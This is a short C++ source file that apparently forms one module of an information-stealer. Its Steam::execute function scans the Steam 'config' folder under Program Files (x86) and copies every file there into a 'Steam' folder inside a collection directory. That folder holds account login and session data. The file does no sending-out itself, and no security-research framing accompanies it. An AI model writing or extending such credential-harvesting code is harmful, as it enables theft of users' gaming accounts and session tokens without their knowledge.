//
// Created by .1qxz on 08.06.2024.
//

#include "Steam.h"

static const fs::path STEAM_PATH = Utils::getSystemDrive() / "\\Program Files (x86)" / "Steam" / "config";


void Steam::execute(fs::path &root) {
    std::vector<fs::path> paths = FilesUtil::scanDirectory(STEAM_PATH, [](const fs::path &path) {
        return !is_directory(path);
    });

    if(paths.empty())
        return;

    fs::path dst = root / "Steam";
    fs::create_directories(dst);

    for(fs::path &path : paths)
    {
        Utils::copy(path, dst);
    }
}

